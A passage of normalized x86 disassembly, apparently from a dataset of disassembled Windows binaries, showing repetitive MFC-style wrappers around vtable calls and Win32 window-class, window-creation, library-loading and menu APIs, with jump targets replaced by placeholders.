mov ecx [ eax ]
push edi
push [ ebp + 0x18 ]
lea esi [ ebp + 0x8 ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x50 ]
pop edi
pop esi
pop ebp
retn 0x14
sub_40ea14
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x28 ]
mov ecx [ eax ]
push esi
push edi
sub esp 0x10
mov edi esp
push [ ebp + 0x8 ]
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x54 ]
pop edi
pop esi
pop ebp
retn 0x14
sub_40ea39
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x28 ]
push esi
mov ecx [ eax ]
push edi
sub esp 0x10
mov edi esp
push [ ebp + 0x14 ]
lea esi [ ebp + 0x18 ]
push [ ebp + 0x10 ]
movsd [ edi ] [ esi ]
push [ ebp + 0xc ]
movsd [ edi ] [ esi ]
push [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x58 ]
pop edi
pop esi
pop ebp
retn 0x20
sub_40ea67
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x28 ]
push esi
push edi
push [ ebp + 0x1c ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
push [ ebp + 0x8 ]
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x5c ]
pop edi
pop esi
pop ebp
retn 0x18
sub_40eaaa
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x28 ]
mov ecx [ eax ]
push esi
push edi
sub esp 0x10
mov edi esp
lea esi [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x64 ]
pop edi
pop esi
pop ebp
retn 0x10
sub_40eacc
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x28 ]
push esi
mov ecx [ eax ]
push edi
push [ ebp + 0x18 ]
lea esi [ ebp + 0x8 ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebp
retn 0x14
sub_40eb62
push 0x14
push r--data
call sub_415ff4
xor esi esi
mov [ ebp - 0x20 ] esi
lea eax [ ebp - 0x20 ]
push eax
call sub_40bc2a
push [ eax + 0x80 ]
call sub_40af55
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] esi
cmp eax esi
jne r-xdata
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call [ RegisterClassW@IAT ]
movzx eax ax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40ebbd
mov ax [ ebp - 0x1c ]
xor eax eax
jmp r-xdata
call sub_416039
retn
sub_40ebbd
cmp [ ebp - 0x24 ] 0x2
je r-xdata
retn
xor eax eax
cmp [ ebp - 0x1c ] ax
sete al
mov esi eax
test esi esi
je r-xdata
xor edi edi
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push edi
call [ SetLastError@IAT ]
push [ ebp - 0x20 ]
push 0x0
call sub_40af3e
test esi esi
je r-xdata
sub_40ebf4
push 0x14
push r--data
call sub_415ff4
xor ebx ebx
mov [ ebp - 0x20 ] ebx
lea eax [ ebp - 0x20 ]
push eax
call sub_40bc2a
push [ eax + 0x80 ]
call sub_40af55
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] ebx
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ GetClassInfoW@IAT ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40ec53
mov eax [ ebp - 0x1c ]
xor eax eax
jmp r-xdata
call sub_416039
retn
sub_40ec53
cmp [ ebp - 0x24 ] 0x2
je r-xdata
retn
xor eax eax
cmp [ ebp - 0x1c ] ebx
sete al
mov esi eax
cmp esi ebx
je r-xdata
xor edi edi
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push edi
call [ SetLastError@IAT ]
push [ ebp - 0x20 ]
push ebx
call sub_40af3e
cmp esi ebx
je r-xdata
sub_40ec88
push 0x14
push r--data
call sub_415ff4
xor ebx ebx
mov [ ebp - 0x20 ] ebx
lea eax [ ebp - 0x20 ]
push eax
call sub_40bc2a
push [ eax + 0x80 ]
call sub_40af55
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] ebx
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ GetClassInfoExW@IAT ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40ece7
mov eax [ ebp - 0x1c ]
xor eax eax
jmp r-xdata
call sub_416039
retn
sub_40ece7
cmp [ ebp - 0x24 ] 0x2
je r-xdata
retn
xor eax eax
cmp [ ebp - 0x1c ] ebx
sete al
mov esi eax
cmp esi ebx
je r-xdata
xor edi edi
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push edi
call [ SetLastError@IAT ]
push [ ebp - 0x20 ]
push ebx
call sub_40af3e
cmp esi ebx
je r-xdata
sub_40ed1c
push 0x14
push r--data
call sub_415ff4
xor ebx ebx
mov [ ebp - 0x20 ] ebx
lea eax [ ebp - 0x20 ]
push eax
call sub_40bc2a
push [ eax + 0x80 ]
call sub_40af55
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] ebx
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
push [ ebp + 0x34 ]
push [ ebp + 0x30 ]
push [ ebp + 0x2c ]
push [ ebp + 0x28 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CreateWindowExW@IAT ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40ed96
mov eax [ ebp - 0x1c ]
xor eax eax
jmp r-xdata
call sub_416039
retn
sub_40ed96
cmp [ ebp - 0x24 ] 0x2
je r-xdata
retn
xor eax eax
cmp [ ebp - 0x1c ] ebx
sete al
mov esi eax
cmp esi ebx
je r-xdata
xor edi edi
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push edi
call [ SetLastError@IAT ]
push [ ebp - 0x20 ]
push ebx
call sub_40af3e
cmp esi ebx
je r-xdata
sub_40edcb
push 0x14
push r--data
call sub_415ff4
xor ebx ebx
mov [ ebp - 0x20 ] ebx
lea eax [ ebp - 0x20 ]
push eax
call sub_40bc2a
push [ eax + 0x80 ]
call sub_40af55
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] ebx
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
push [ ebp + 0x8 ]
call [ LoadLibraryA@IAT ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40ee24
mov eax [ ebp - 0x1c ]
xor eax eax
jmp r-xdata
call sub_416039
retn
sub_40ee24
cmp [ ebp - 0x24 ] 0x2
je r-xdata
retn
xor eax eax
cmp [ ebp - 0x1c ] ebx
sete al
mov esi eax
cmp esi ebx
je r-xdata
xor edi edi
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push edi
call [ SetLastError@IAT ]
push [ ebp - 0x20 ]
push ebx
call sub_40af3e
cmp esi ebx
je r-xdata
sub_40eecc
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax 0x7fffffff
cmp esi eax
je r-xdata
mov ecx [ ecx ]
pop esi
cmp ecx eax
je r-xdata
mov edx [ ecx ]
cmp edx eax
je r-xdata
call sub_40a7dd
push ecx
call sub_40ae76
pop ebp
retn 0x4
mov [ ecx ] esi
cmp edx esi
je r-xdata
sub_40ef35
mov edi edi
push esi
mov esi ecx
call sub_40d6f1
xor eax eax
mov [ esi ] r--data
mov [ esi + 0x30 ] r--data
mov [ esi + 0x34 ] r--data
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] al
mov [ esi + 0x2c ] eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] eax
mov [ esi + 0x48 ] eax
mov [ esi + 0x4c ] eax
mov [ esi + 0x50 ] eax
mov eax esi
pop esi
retn
sub_40efb8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x1c ]
push ebx
push esi
push edi
test eax eax
jne r-xdata
mov edi [ eax + 0x20 ]
xor edi edi
jmp r-xdata
push [ ebp + 0x24 ]
mov eax [ ebp + 0x18 ]
push [ ebp + 0x20 ]
mov edx [ eax + 0x4 ]
mov esi [ eax ]
push edi
mov edi [ eax + 0xc ]
mov eax [ eax + 0x8 ]
mov ebx [ ecx ]
sub edi edx
push edi
sub eax esi
push eax
push edx
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ ebx + 0x5c ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x20
sub_40f003
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push ebx
push esi
push edi
test eax eax
jne r-xdata
mov edi [ eax + 0x20 ]
xor edi edi
jmp r-xdata
push [ ebp + 0x20 ]
mov eax [ ebp + 0x14 ]
push [ ebp + 0x1c ]
mov edx [ eax + 0x4 ]
mov esi [ eax ]
mov ebx [ ecx ]
push edi
mov edi [ eax + 0xc ]
mov eax [ eax + 0x8 ]
sub edi edx
push edi
sub eax esi
push eax
mov eax [ ebp + 0x10 ]
push edx
push esi
or eax 0x40000000
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x0
call [ ebx + 0x5c ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x1c
sub_40f053
mov edi edi
push ebp
mov ebp esp
push esi
call sub_40bc5d
mov esi eax
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
cmp [ ebp + 0x8 ] 0x0
mov esi [ esi + 0x50 ]
je r-xdata
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
pop esi
pop ebp
retn 0x4
test esi esi
je r-xdata
push 0x0
push 0x0
push 0x401
push eax
call [ SendMessageW@IAT ]
push 0x1
call [ GetKeyState@IAT ]
test ax ax
jl r-xdata
mov eax [ esi ]
push 0xffffffff
mov ecx esi
call [ eax + 0x178 ]
sub_40f0a9
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
jne r-xdata
push [ esi + 0x4 ]
call [ GetMenuItemCount@IAT ]
xor edi edi
mov [ ebp + 0x8 ] eax
test eax eax
jle r-xdata
call sub_40a7dd
xor eax eax
mov ebx [ ebp + 0xc ]
push edi
mov ecx esi
call sub_40ee59
cmp eax ebx
je r-xdata
cmp [ eax + 0x4 ] ebx
je r-xdata
push [ esi + 0x4 ]
call sub_413334
jmp r-xdata
inc edi
cmp edi [ ebp + 0x8 ]
jl r-xdata
push ebx
push eax
call sub_40f0a9
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
mov ecx esi
call sub_40ee6e
test eax eax
je r-xdata
jmp r-xdata
sub_40f12a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40f115
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a919
sub_40f14a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40bc2a
mov eax [ eax + 0x4 ]
cmp [ eax + 0x6c ] 0x1
jne r-xdata
push [ ebp + 0xc ]
mov eax [ esi ]
push [ ebp + 0x8 ]
mov ecx esi
call [ eax + 0x7c ]
mov eax [ ebp + 0xc ]
cmp eax 0x1
jne r-xdata
cmp eax 0x3
jne r-xdata
push 0xf
pop eax
jmp r-xdata
cmp eax 0xb
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov edx [ esi ]
push eax
push [ ebp + 0x8 ]
mov ecx esi
call [ edx + 0x80 ]
jmp r-xdata
xor eax eax
pop esi
pop ebp
retn 0x8
sub_40f1a0
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop ebp
retn 0x8
call sub_40bc5d
mov eax [ eax + 0x48 ]
test eax eax
je r-xdata
test [ eax + 0x4 ] 0x40000000
jne r-xdata
push 0x1
call sub_40f053
sub_40f1ce
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov esi [ ebp + 0x8 ]
push [ esi - 0x14 ]
add esi 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_40bc76
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_40c8f7
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0x4
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40f216
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov esi [ ebp + 0x8 ]
push [ esi - 0x14 ]
add esi 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_40bc76
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_40c968
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0x4
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40f25e
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov esi [ ebp + 0x8 ]
push [ esi - 0x14 ]
add esi 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_40bc76
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
mov ecx esi
call sub_40c9c0
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0xc
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40f2ac
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov esi [ ebp + 0x8 ]
push [ esi - 0x14 ]
lea ecx [ ebp - 0x14 ]
call sub_40bc76
push [ ebp + 0x28 ]
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_40df4c
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0x24
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40f308
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov esi [ ebp + 0x8 ]
push [ esi - 0x14 ]
add esi 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_40bc76
push [ ebp + 0xc ]
mov eax [ esi ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
call [ eax + 0x94 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0x8
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40f356
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov esi [ ebp + 0x8 ]
push [ esi - 0x14 ]
add esi 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_40bc76
push [ ebp + 0xc ]
mov eax [ esi ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
call [ eax + 0x98 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0x8
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40f3a4
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_40bc76
push [ ebp + 0x1c ]
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0x9c ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0x18
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40f3fe
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_40bc76
push [ ebp + 0x1c ]
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0xa0 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0x18
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40f458
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_40bc76
push [ ebp + 0x1c ]
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0xa4 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0x18
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40f4b2
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_40bc76
push [ ebp + 0x1c ]
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0xa8 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0x18
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40f50c
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_40bc76
push [ ebp + 0x1c ]
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0xac ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0x18
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40f566
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_40bc76
push [ ebp + 0x1c ]
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0xb0 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0x18
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40f5c0
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_40bc76
push [ ebp + 0x1c ]
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0xb4 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0x18
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40f61a
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_40bc76
push [ ebp + 0x20 ]
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
push [ ebp + 0xc ]
lea esi [ ebp + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0xb8 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0x1c
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40f677
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_40bc76
push [ ebp + 0x1c ]
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0xbc ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0x18
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40f6d1
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov esi [ ebp + 0x8 ]
push [ esi - 0x14 ]
add esi 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_40bc76
push [ ebp + 0xc ]
mov eax [ esi ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
call [ eax + 0xc0 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0x8
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40f71f
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov esi [ ebp + 0x8 ]
push [ esi - 0x14 ]
add esi 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_40bc76
push [ ebp + 0xc ]
mov eax [ esi ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
call [ eax + 0xc4 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0x8
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40f76d
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_40bc76
push [ ebp + 0x1c ]
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0xc8 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0x18
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40f7c7
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_40bc76
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
push [ ebp + 0xc ]
lea esi [ ebp + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0xcc ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0x18
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40f821
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_40bc76
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
push [ ebp + 0x18 ]
lea esi [ ebp + 0x1c ]
push [ ebp + 0x14 ]
movsd [ edi ] [ esi ]
push [ ebp + 0x10 ]
movsd [ edi ] [ esi ]
push [ ebp + 0xc ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0xd0 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0x24
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40f884
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_40bc76
push [ ebp + 0x20 ]
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
push [ ebp + 0xc ]
lea esi [ ebp + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0xd4 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0x1c
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40f8e1
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov esi [ ebp + 0x8 ]
push [ esi - 0x14 ]
add esi 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_40bc76
push [ ebp + 0x14 ]
mov eax [ esi ]
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
mov ecx esi
call [ eax + 0xd8 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0x10
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40f935
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_40bc76
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0xdc ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0x14
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40f98c
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_40bc76
push [ ebp + 0x1c ]
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0xe0 ]
or [ ebp - 0x4 ] 0xffffffff
